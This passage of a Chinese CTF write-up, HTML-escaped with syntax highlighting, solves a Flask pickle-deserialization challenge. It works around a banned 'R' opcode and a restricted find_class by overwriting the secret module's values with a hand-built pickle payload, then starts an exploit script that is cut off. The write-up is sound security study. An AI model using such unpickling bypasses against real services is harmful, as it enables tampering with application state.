&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">flask&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">Response&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">request&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">secret&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Animal&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">category&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">category&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__repr__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;Animal(name=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#d88200">!r}&lt;/span>&lt;span style="color:#d88200">, category=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>&lt;span style="color:#d88200">!r}&lt;/span>&lt;span style="color:#d88200">)&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__eq__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">other&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#111">Animal&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Unpickler&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">find_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modules&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">UnpicklingError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;global &amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">.&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39; is forbidden&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">BytesIO&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">load&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf-8&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">filename&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;r&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">fin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;GET&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;source&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">Response&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__file__&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">mimetype&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;text/plain&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">method&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;POST&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">pickle_data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;R&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;No... I don&lt;/span>&lt;span style="color:#8045ff">\&amp;#39;&lt;/span>&lt;span style="color:#d88200">t like R-things. No Rabits, Rats, Roosters or RCEs.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">Animal&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#39;Are you sure that is an animal???&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">correct&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">Animal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unpickle_result.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">giveflag&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">correct&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">Exception&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">repr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Something wrong&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sample_obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Animal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;一给我哩giaogiao&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Giao&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">pickle_data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sample_obj&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;unpickle_page.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">sample_obj&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">sample_obj&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">pickle_data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>看源码，opcode部分ban掉了&lt;code>R&lt;/code>操作码（调用一个callable对象），不能用&lt;code>__reduce__&lt;/code>了；也重写了&lt;code>find_class()&lt;/code>，module必须是&lt;code>__main__&lt;/code>；我们的目标是&lt;/p>
&lt;p>&lt;code>restricted_loads(base64.b64decode(pickle_data)) == Animal(secret.name, secret.category)&lt;/code>为真，即correct==True&lt;/p>
&lt;p>这里我们通过加载&lt;code>__main__.secret&lt;/code>可以引入secret模块，来把&lt;code>secret.name&lt;/code>和&lt;code>secret.category&lt;/code>这两个变量覆盖为任意字符串，再以这个字符串为参数构造Animal对象（栈顶对于type的检查）&lt;/p>
&lt;p>pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">secret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;secret&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;frieggs&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;frieggs&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">animal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Animal&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;frieggs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;frieggs&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">animal&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># b&amp;#34;c__main__\nsecret\np0\n0g0\n(}(S&amp;#39;name&amp;#39;\nS&amp;#39;frieggs&amp;#39;\ndtbg0\n(}(S&amp;#39;category&amp;#39;\nS&amp;#39;frieggs&amp;#39;\ndtb(S&amp;#39;frieggs&amp;#39;\nS&amp;#39;frieggs&amp;#39;\ni__main__\nAnimal\np3\n0g3\n.&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>或者构造的exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Animal&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">category&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">category&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__repr__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;Animal(name=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#d88200">!r}&lt;/span>&lt;span style="color:#d88200">, category=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>&lt;span style="color:#d88200">!r}&lt;/span>&lt;span style="color:#d88200">)&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__eq__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">other&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#111">Animal&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">Animal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;x&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">category&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;y&amp;#34;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">protocol&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span 